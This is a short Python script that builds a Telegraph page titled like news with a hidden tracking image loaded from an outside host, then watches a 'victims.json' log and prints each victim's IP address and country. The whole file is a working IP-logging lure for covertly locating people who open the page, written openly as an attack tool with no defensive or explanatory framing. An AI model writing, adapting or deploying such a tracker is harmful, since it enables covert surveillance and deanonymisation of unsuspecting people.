#!/usr/bin/env python3
import json
import time
import os
from telegraph import Telegraph

class TeleLoggerSimple:
    def __init__(self):
        self.telegraph = Telegraph()
        self.telegraph.create_account(short_name='TeleLogger')
        
    def create_page(self, title, description, image_url):
        content = f"""
        <p><b>{title}</b></p>
        <p>{description}</p>
        <p><img src="{image_url}" style="display:none" /></p>
        """
        return self.telegraph.create_page(title=title, html_content=content)['url']
    
    def watch_logs(self, log_file='victims.json'):
        print("[+] Watching for victims...")
        last_size = 0
        while True:
            if os.path.exists(log_file):
                with open(log_file, 'r') as f:
                    lines = f.readlines()
                    for line in lines[last_size:]:
                        data = json.loads(line)
                        print(f"\n[!] Victim: {data.get('ip')} | {data.get('country')}")
                    last_size = len(lines)
            time.sleep(2)
    
    def run(self, title, description, image_url):
        url = self.create_page(title, description, image_url)
        print(f"[+] Page: {url}")
        self.watch_logs()

if __name__ == "__main__":
    logger = TeleLoggerSimple()
    logger.run("News", "Update", "https://mwr-2w7j.vercel.app/track.jpg")